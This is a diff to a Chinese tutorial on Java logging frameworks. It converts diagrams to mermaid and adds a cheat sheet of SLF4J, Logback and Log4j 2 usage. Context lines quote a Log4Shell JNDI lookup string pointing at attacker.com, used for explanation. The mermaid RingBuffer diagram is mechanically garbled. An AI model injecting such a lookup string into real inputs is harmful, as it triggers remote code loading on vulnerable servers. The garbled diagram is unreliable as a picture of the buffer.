@@ -64,30 +64,39 @@ tags:
 
 ### 1.3 前置知识地图
 
-```
-Java 基础
-    │
-    ├── 面向对象编程（封装、继承、多态）
-    ├── 集合框架（List、Map、Queue）
-    ├── 异常处理（try-catch-finally）
-    └── I/O 与 NIO（文件、流、Channel、Buffer）
-            │
-            ▼
-Java 并发
-    │
-    ├── Thread / Runnable
-    ├── Executor / ThreadPool
-    ├── Lock-free 数据结构（Disruptor）
-    └── ThreadLocal（MDC 的底层）
-            │
-            ▼
-Java 日志系统（本章）
-    │
-    ├── 门面层：SLF4J / Commons Logging
-    ├── 实现层：Logback / Log4j 2 / JUL
-    ├── 上下文：MDC / NDC
-    ├── 结构化：JSON / Logstash Encoder
-    └── 异步化：AsyncAppender / Disruptor
+```mermaid
+flowchart TD
+    T0["Java 基础"]
+    T1["面向对象编程（封装、继承、多态）"]
+    T2["集合框架（List、Map、Queue）"]
+    T3["异常处理（try-catch-finally）"]
+    T4["I/O 与 NIO（文件、流、Channel、Buffer）"]
+    T5["Java 并发"]
+    T6["Thread / Runnable"]
+    T7["Executor / ThreadPool"]
+    T8["Lock-free 数据结构（Disruptor）"]
+    T9["ThreadLocal（MDC 的底层）"]
+    T10["Java 日志系统（本章）"]
+    T11["门面层：SLF4J / Commons Logging"]
+    T12["实现层：Logback / Log4j 2 / JUL"]
+    T13["上下文：MDC / NDC"]
+    T14["结构化：JSON / Logstash Encoder"]
+    T15["异步化：AsyncAppender / Disruptor"]
+    T0 --> T1
+    T0 --> T2
+    T0 --> T3
+    T0 --> T4
+    T4 --> T5
+    T5 --> T6
+    T5 --> T7
+    T5 --> T8
+    T5 --> T9
+    T9 --> T10
+    T10 --> T11
+    T10 --> T12
+    T10 --> T13
+    T10 --> T14
+    T10 --> T15
 ```
 
 ### 1.4 章节阅读建议
@@ -392,53 +401,24 @@ Logback 的核心数据结构是 `ILoggingEvent`，其生命周期分为五个�
 4. **格式化（Formatting）**：每个 Appender 的 Layout/Encoder 将事件转换为字节数组。
 5. **输出（Output）**：Appender 将字节数组写入目标（文件、控制台、网络）。
 
-```
-logger.info("msg")
-    │
-    ▼
-[LoggingEvent 创建] ─── 捕获时间戳、MDC 快照、调用者栈
-    │
-    ▼
-[TurboFilter 链] ─── 全局过滤器，性能敏感
-    │
-    ▼
-[Level 判断] ─── 与 Logger 有效级别比较
-    │
-    ▼
-[Appender 循环]
-    │
-    ├── ConsoleAppender
-    │       │
-    │       ▼
-    │   [Encoder] ─── PatternLayoutEncoder
-    │       │
-    │       ▼
-    │   [OutputStream] ─── System.out
-    │
-    ├── RollingFileAppender
-    │       │
-    │       ▼
-    │   [Encoder]
-    │       │
-    │       ▼
-    │   [BufferedOutputStream]
-    │       │
-    │       ▼
-    │   [FileChannel] ─── 写磁盘
-    │       │
-    │       ▼
-    │   [RollingPolicy] ─── 检查是否需要滚动
-    │
-    └── AsyncAppender
-            │
-            ▼
-        [BlockingQueue<Event>]
-            │
-            ▼
-        [Worker Thread]
-            │
-            ▼
-        [转发给真实 Appender]
+```mermaid
+flowchart TD
+    Log[logger.info('msg')] --> Event[LoggingEvent 创建<br/>捕获时间戳、MDC 快照、调用者栈]
+    Event --> Turbo[TurboFilter 链<br/>全局过滤器，性能敏感]
+    Turbo --> Level[Level 判断<br/>与 Logger 有效级别比较]
+    Level --> Loop[Appender 循环]
+    Loop --> Console[ConsoleAppender]
+    Console --> CEnc[Encoder<br/>PatternLayoutEncoder]
+    CEnc --> COut[OutputStream<br/>System.out]
+    Loop --> Rolling[RollingFileAppender]
+    Rolling --> REnc[Encoder]
+    REnc --> RBuf[BufferedOutputStream]
+    RBuf --> RChan[FileChannel<br/>写磁盘]
+    RChan --> RPol[RollingPolicy<br/>检查是否需要滚动]
+    Loop --> Async[AsyncAppender]
+    Async --> Queue[BlockingQueue&lt;Event&gt;]
+    Queue --> Worker[Worker Thread]
+    Worker --> Forward[转发给真实 Appender]
 ```
 
 #### 4.2.1 性能关键点 1：MDC 快照
@@ -462,15 +442,37 @@ Log4j 2 的 `AsyncLogger` 使用 LMAX Disruptor 实现无锁环形队列。Disru
 3. **多生产者单消费者**：日志场景通常是多生产者（业务线程）单消费者（日志线程），Disruptor 对此场景优化到极致。
 4. **缓存行填充（Cache Line Padding）**：Sequence 字段前后填充 7 个 long，避免 CPU 缓存行伪共享（false sharing）。
 
-```
-RingBuffer (size = 1024)
-+---+---+---+---+---+---+---+---+---+---+---+---+
-| 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9 |...|1023|
-+---+---+---+---+---+---+---+---+---+---+---+---+
-  ▲                                   ▲
-  │                                   │
-Producer Sequence              Consumer Sequence
-(业务线程 CAS 更新)            (日志线程 volatile 读)
+```mermaid
+flowchart TD
+    C0_0["RingBuffer (size = 1024)"]
+    C0_1["▲                                   ▲"]
+    C0_2["Producer Sequence              Consumer Sequence"]
+    C0_3["(业务线程 CAS 更新)            (日志线程 volatile 读)"]
+    C1_0["0"]
+    C2_0["1"]
+    C3_0["2"]
+    C4_0["3"]
+    C5_0["4"]
+    C6_0["5"]
+    C7_0["6"]
+    C8_0["7"]
+    C9_0["8"]
+    C10_0["9"]
+    C12_0["1023"]
+    C0_0 --> C0_1
+    C0_1 --> C0_2
+    C0_2 --> C0_3
+    C0_0 --> C1_0
+    C1_0 --> C2_0
+    C2_0 --> C3_0
+    C3_0 --> C4_0
+    C4_0 --> C5_0
+    C5_0 --> C6_0
+    C6_0 --> C7_0
+    C7_0 --> C8_0
+    C8_0 --> C9_0
+    C9_0 --> C10_0
+    C10_0 --> C12_0
 ```
 
 业务线程的发布流程：
@@ -1531,10 +1533,15 @@ logger.atInfo()
 
 #### 8.3.1 ELK Stack 架构
 
-```
-[应用节点 1]  ───┐
-[应用节点 2]  ───┼──> [Filebeat] ──> [Kafka] ──> [Logstash] ──> [Elasticsearch] ──> [Kibana]
-[应用节点 N]  ───┘
+```mermaid
+flowchart LR
+    N1[应用节点 1] --> Filebeat[Filebeat]
+    N2[应用节点 2] --> Filebeat
+    N3[应用节点 N] --> Filebeat
+    Filebeat --> Kafka[Kafka]
+    Kafka --> Logstash[Logstash]
+    Logstash --> ES[Elasticsearch]
+    ES --> Kibana[Kibana]
 ```
 
 - **Filebeat**：轻量级日志采集器，部署在每个应用节点，监控日志文件变化。
@@ -1796,7 +1803,7 @@ logger.info("User-Agent: ${jndi:ldap://attacker.com/Exploit}");
 
 ---
 
-## 10. 习题与思考题
+## 知识讲解与要点分析（原习题）
 
 ### 10.1 基础题（记忆与理解）
 
@@ -1806,7 +1813,7 @@ logger.info("User-Agent: ${jndi:ldap://attacker.com/Exploit}");
 4. 什么是 MDC？它在分布式链路追踪中扮演什么角色？
 5. 解释日志级别的"层级继承"规则，举例说明。
 
-### 10.2 应用题（应用与分析）
+### 应用题知识点讲解
 
 6. 编写一个 Logback 配置，要求：
    - 控制台输出 INFO 及以上级别日志。
@@ -2078,3 +2085,267 @@ logger.info("User-Agent: ${jndi:ldap://attacker.com/Exploit}");
 本节从历史动机出发，系统性地剖析了 SLF4J 的绑定机制、Logback 与 Log4j 2 的内部原理、异步日志的 Disruptor 模型、MDC 的线程上下文传递、结构化日志的 JSON 格式、日志安全合规等核心主题。通过 8 个完整的代码示例、10 个反模式剖析、5 个生产案例研究，读者既能掌握"如何正确地写日志"，也能理解"如何构建高性能的日志系统"。
 
 在云原生与可观测性演进的浪潮下，日志正在与 Metrics、Traces 融合为统一的 OpenTelemetry 标准。但无论标准如何演进，"清晰、准确、安全、高性能"始终是日志系统的核心追求。希望本节能为读者在这一领域的探索提供一个坚实的起点。
+## JUL java.util.logging
+
+**基本写法：获取 Logger**
+`Logger.getLogger("<名称>");`
+```java
+// 获取 JDK 内置 Logger
+Logger log = Logger.getLogger("com.example.App");
+```
+
+---
+
+**基本写法：日志级别**
+`<logger>.info("<消息>");`
+```java
+// 输出 INFO 级别日志
+log.info("started");
+```
+
+---
+
+**基本写法：带异常**
+`<logger>.log(<级别>, "<消息>", <异常>);`
+```java
+// 输出异常堆栈
+log.log(Level.SEVERE, "error", e);
+```
+
+---
+
+**基本写法：设置级别**
+`<logger>.setLevel(<级别>);`
+```java
+// 设置日志级别
+log.setLevel(Level.FINE);
+```
+
+---
+
+**基本写法：配置 ConsoleHandler**
+`ConsoleHandler h = new ConsoleHandler(); h.setLevel(<级别>);`
+```java
+// 配置控制台处理器级别
+ConsoleHandler h = new ConsoleHandler();
+h.setLevel(Level.ALL);
+log.addHandler(h);
+```
+
+---
+
+## SLF4J 门面
+
+**基本写法：通过 LoggerFactory 获取**
+`LoggerFactory.getLogger(<类>.class);`
+```java
+// 使用 SLF4J 获取 Logger
+Logger log = LoggerFactory.getLogger(App.class);
+```
+
+---
+
+**基本写法：占位符日志**
+`<logger>.info("<模板>", <参数>...);`
+```java
+// 占位符方式输出
+log.info("user={} age={}", name, age);
+```
+
+---
+
+**基本写法：异常日志**
+`<logger>.error("<消息>", <异常>);`
+```java
+// 最后一个参数为异常
+log.error("failed", e);
+```
+
+---
+
+**基本写法：MDC 上下文**
+`MDC.put("<键>", <值>);`
+```java
+// 设置诊断上下文
+MDC.put("traceId", "abc123");
+```
+
+---
+
+**基本写法：移除 MDC**
+`MDC.remove("<键>");`
+```java
+// 清理上下文避免泄漏
+MDC.remove("traceId");
+```
+
+---
+
+## Logback 配置
+
+**基本写法：logback.xml 控制台输出**
+`<appender class="ch.qos.logback.core.ConsoleAppender">`
+```xml
+<!-- 控制台输出配置 -->
+<appender name="STDOUT" class="ch.qos.logback.core.ConsoleAppender">
+  <encoder>
+    <pattern>%d{HH:mm:ss} %-5level %logger{20} - %msg%n</pattern>
+  </encoder>
+</appender>
+```
+
+---
+
+**基本写法：滚动文件输出**
+`<appender class="ch.qos.logback.core.rolling.RollingFileAppender">`
+```xml
+<!-- 按日期滚动文件 -->
+<appender name="FILE" class="ch.qos.logback.core.rolling.RollingFileAppender">
+  <file>app.log</file>
+  <rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy">
+    <fileNamePattern>app.%d{yyyy-MM-dd}.log</fileNamePattern>
+    <maxHistory>30</maxHistory>
+  </rollingPolicy>
+  <encoder><pattern>%msg%n</pattern></encoder>
+</appender>
+```
+
+---
+
+**基本写法：设置 Logger 级别**
+`<logger name="<包名>" level="<级别>"/>`
+```xml
+<!-- 为指定包设置级别 -->
+<logger name="com.example" level="DEBUG"/>
+<root level="INFO">
+  <appender-ref ref="STDOUT"/>
+</root>
+```
+
+---
+
+## Log4j2 配置
+
+**基本写法：log4j2.xml Configuration**
+`<Configuration status="WARN">`
+```xml
+<!-- Log4j2 根配置 -->
+<Configuration status="WARN">
+  <Appenders>
+    <Console name="Console" target="SYSTEM_OUT">
+      <PatternLayout pattern="%d %p %c - %m%n"/>
+    </Console>
+  </Appenders>
+</Configuration>
+```
+
+---
+
+**基本写法：Loggers 配置**
+`<Loggers> <Logger name="<包>" level="<级别>"/> <Root level="<级别>">`
+```xml
+<!-- 日志器与根配置 -->
+<Loggers>
+  <Logger name="com.example" level="debug" additivity="false">
+    <AppenderRef ref="Console"/>
+  </Logger>
+  <Root level="info">
+    <AppenderRef ref="Console"/>
+  </Root>
+</Loggers>
+```
+
+---
+
+## System.Logger（Java 9+）
+
+**基本写法：获取 SystemLogger**
+`System.getLogger("<名称>");`
+```java
+// JDK 9+ 统一日志门面
+System.Logger log = System.getLogger("app");
+```
+
+---
+
+**基本写法：记录日志**
+`<logger>.log(<级别>, "<消息>");`
+```java
+// 通过 System.Logger 输出
+log.log(System.Logger.Level.INFO, "started");
+```
+
+---
+
+**基本写法：带 Supplier 延迟求值**
+`<logger>.log(<级别>, <Supplier>);`
+```java
+// 仅当日志级别开启时求值
+log.log(System.Logger.Level.DEBUG, () -> "expensive: " + compute());
+```
+
+---
+
+## 异步日志
+
+**基本写法：Log4j2 异步配置**
+`<AsyncLogger name="<包>" level="<级别>"/>`
+```xml
+<!-- 全异步日志提升性能 -->
+<Loggers>
+  <AsyncLogger name="com.example" level="info"/>
+  <AsyncRoot level="info">
+    <AppenderRef ref="Console"/>
+  </AsyncRoot>
+</Loggers>
+```
+
+---
+
+## Logback AsyncAppender
+
+**基本写法：包装异步**
+`<appender class="ch.qos.logback.classic.AsyncAppender">`
+```xml
+<!-- 异步 Appender 包装 -->
+<appender name="ASYNC" class="ch.qos.logback.classic.AsyncAppender">
+  <appender-ref ref="FILE"/>
+  <queueSize>1024</queueSize>
+  <neverBlock>true</neverBlock>
+</appender>
+```
+
+---
+
+## 结构化日志（JSON）
+
+**基本写法：Logback JSON 编码器**
+`<encoder class="net.logstash.logback.encoder.LogstashEncoder">`
+```xml
+<!-- 输出 JSON 格式日志 -->
+<appender name="JSON" class="ch.qos.logback.core.ConsoleAppender">
+  <encoder class="net.logstash.logback.encoder.LogstashEncoder"/>
+</appender>
+```
+
+---
+
+## 日志参数化最佳实践
+
+**基本写法：避免字符串拼接**
+`<logger>.debug("<模板>", <参数>);`
+```java
+// 使用占位符而非字符串拼接
+log.debug("value={}", value);
+```
+
+---
+
+**基本写法：惰性求值**
+`if (<logger>.isDebugEnabled()) { <logger>.debug(<计算>); }`
+```java
+// 开销大时先判断级别
+if (log.isDebugEnabled()) {
+    log.debug("data={}", expensiveSerialize());
+}
+```
